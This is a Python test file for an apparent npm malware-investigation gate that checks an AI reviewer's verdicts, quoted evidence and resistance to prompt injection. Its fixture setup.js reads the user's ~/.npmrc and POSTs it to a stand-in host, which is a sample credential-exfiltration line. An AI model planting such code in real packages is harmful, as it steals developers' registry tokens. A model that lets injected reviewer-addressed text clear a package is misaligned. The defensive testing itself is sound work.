
from npmdiffwatch import investigate_gate as g
from npmdiffwatch.config import Config


class _WS:
    """The parts of a Workspace the gate reads."""
    def __init__(self, files, read_full=(), scripts=True, facts=(), too_large=()):
        self.files = {"flagged": {p: t.encode() for p, t in files.items()}}
        self.read_full = set(read_full)
        self.read_text = {("flagged", p): t for p, t in files.items() if ("flagged", p) in set(read_full)}
        self.scripts_seen = {"flagged"} if scripts else set()
        self.facts = list(facts)
        self._too_large = list(too_large)
        self.inv = Config().investigator
    def required_files(self): return ["setup.js", "index.js"]
    def too_large(self): return self._too_large


FILES = {"setup.js": "const t = require('fs').readFileSync(home + '/.npmrc', 'utf8');\n"
                     "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);\n",
         "index.js": "module.exports = function add(a, b) { return a + b; };\n"}
ALL = [("flagged", "setup.js"), ("flagged", "index.js")]


def _q(path, code): return {"version": "flagged", "path": path, "code": code}


def _answer(verdict, **kw):
    a = {k: {"answer": "x", "quotes": []} for k in g.CHECKLIST}
    a.update(verdict=verdict, confidence=0.9, reason="r", indicators=[], chain_source=None, chain_sink=None,
             explanation=None)
    a.update(kw)
    return a


def test_a_quoted_complete_chain_is_confirmed():
    o = g.judge(_answer("malicious",
                        chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
                        chain_sink=_q("setup.js", "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);")),
                _WS(FILES, ALL))
    assert (o.verdict, o.outcome) == ("malicious", "confirmed")


def test_malicious_without_a_valid_chain_stays_malicious_but_inconclusive():
    o = g.judge(_answer("malicious", chain_source=_q("setup.js", "not in the file at all"),
                        chain_sink=_q("setup.js", "also not there, anywhere")), _WS(FILES, ALL))
    assert (o.verdict, o.outcome) == ("malicious", "inconclusive") and o.rejected_quotes == 2


def test_a_downgrade_with_coverage_and_an_explanation_is_disputed():
    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b) { return a + b; };")),
                _WS(FILES, ALL))
    assert (o.verdict, o.outcome) == ("benign", "disputed")


def test_injected_downgrade_without_coverage_is_inconclusive():
    o = g.judge(_answer("suspicious", explanation=_q("index.js", "module.exports = function add(a, b)")),
                _WS(FILES, [("flagged", "index.js")]))
    assert (o.verdict, o.outcome) == ("malicious", "inconclusive")
    assert any("setup.js" in n for n in o.notes)


def test_a_downgrade_without_looking_at_the_scripts_is_inconclusive():
    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
                _WS(FILES, ALL, scripts=False))
    assert o.outcome == "inconclusive"


def test_a_downgrade_without_an_explanation_quote_is_inconclusive():
    o = g.judge(_answer("benign"), _WS(FILES, ALL))
    assert (o.verdict, o.outcome) == ("malicious", "inconclusive")


def test_a_too_large_entry_point_keeps_it_malicious():
    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
                _WS(FILES, ALL, too_large=["dist/big.js"]))
    assert (o.verdict, o.outcome) == ("malicious", "inconclusive")
    assert any("too large" in n for n in o.notes)


def test_quotes_must_come_from_the_flagged_version():
    a = _answer("benign", explanation={"version": "prior", "path": "index.js", "code": "module.exports = function add(a, b)"})
    assert g.judge(a, _WS(FILES, ALL)).outcome == "inconclusive"


def test_a_quote_from_a_file_it_did_not_read_is_rejected():
    o = g.judge(_answer("malicious",
                        chain_source=_q("setup.js", "readFileSync(home + '/.npmrc', 'utf8')"),
                        chain_sink=_q("setup.js", "https.request({ host: 'c.example.invalid', method: 'POST' }).end(t);")),
                _WS(FILES, [("flagged", "index.js")]))
    assert o.outcome == "inconclusive"


def test_an_injection_attempt_makes_it_contested():
    o = g.judge(_answer("benign", explanation=_q("index.js", "module.exports = function add(a, b)")),
                _WS(FILES, ALL, facts=["index.js contains text that addresses the reviewer (possible injection)"]))
    assert (o.verdict, o.outcome) == ("malicious", "contested")     # an injection attempt never clears anything


def test_the_schema_requires_the_purpose_question():
    assert "purpose_consistency" in g.ANSWER_SCHEMA["required"]
